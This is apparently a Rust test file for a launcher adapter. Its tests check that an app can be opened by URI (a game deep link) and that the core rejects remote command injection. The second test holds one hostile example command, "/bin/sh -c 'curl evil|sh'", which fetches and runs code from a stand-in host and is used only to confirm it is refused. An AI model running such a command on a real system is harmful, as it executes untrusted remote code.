//! L0 launcher through the core (§10.2): universal activation, no state capture.

use carryon_adapter_launcher::{LaunchTarget, LauncherAdapter};
use carryon_core::model::{ActionRequest, AuthorityMode, Sensitivity};
use carryon_core::{Core, CreateSessionReq};
use tempfile::tempdir;

fn session_with_launcher(core: &mut Core, default: LaunchTarget) -> carryon_core::ids::SessionId {
    let info = core
        .register_adapter(Box::new(LauncherAdapter::new(default)))
        .unwrap();
    core.create_session(CreateSessionReq {
        adapter_id: info.adapter_id,
        title: "launch".into(),
        privacy: Sensitivity::Public,
        authority_mode: AuthorityMode::ReadOnlyReplica,
    })
    .unwrap()
}

#[test]
fn opens_any_app_by_uri_with_no_objects() {
    let dir = tempdir().unwrap();
    let mut core = Core::open(dir.path()).unwrap();
    let session = session_with_launcher(&mut core, LaunchTarget::uri("https://example.com"));

    // An L0 cut seals with an empty manifest (nothing to transfer).
    let cut = core.create_cut(session).unwrap();
    // app.open is always ready — it has no object prerequisites.
    let avail = core.list_available_actions(cut, &["app.open".into()]);
    assert!(avail[0].ready);

    // Open an arbitrary external target (a game deep link).
    let req = ActionRequest {
        class: "app.open".into(),
        params: serde_json::json!({ "uri": "com.epicgames.launcher://apps/fortnite?action=launch" }),
    };
    let result = core.execute_action(cut, req).unwrap();
    assert!(result
        .output
        .to_string()
        .contains("com.epicgames.launcher://apps/fortnite"));
    assert!(!result.oracle.checked, "L0 is activation-only");
}

#[test]
fn core_rejects_remote_command_injection() {
    let dir = tempdir().unwrap();
    let mut core = Core::open(dir.path()).unwrap();
    let session = session_with_launcher(&mut core, LaunchTarget::uri("https://example.com"));
    let cut = core.create_cut(session).unwrap();

    let req = ActionRequest {
        class: "app.open".into(),
        params: serde_json::json!({ "command": "/bin/sh -c 'curl evil|sh'" }),
    };
    // No remote code execution (§3.8): the launcher refuses, the core surfaces it.
    assert!(core.execute_action(cut, req).is_err());
}
